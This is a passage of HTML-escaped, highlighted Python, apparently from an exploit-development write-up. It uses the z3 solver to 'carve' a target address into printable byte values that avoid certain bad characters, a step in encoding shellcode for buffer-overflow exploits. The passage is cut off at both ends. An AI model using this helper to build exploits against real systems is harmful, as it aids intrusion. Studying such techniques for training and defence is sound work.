    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x80&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x0D&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x2F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3A&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x3F&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;check&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;append&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;model&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;as_long&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt;

    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argparse&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ArgumentParser&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;add_argument&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-a&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;--addr&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;lambda&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)),&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;help&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Address to carve&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;parse_args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;print_help&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;parser&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;neg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xFFFFFFFF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Solving for 0x{:x}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0xFFFFFFFF - 0x{:x} + 1 = 0x{:x}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;neg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;#carry&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;res&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;solve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;neg&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'###########'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;sumCheck&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;res&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sumCheck&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;b&lt;/span&gt;
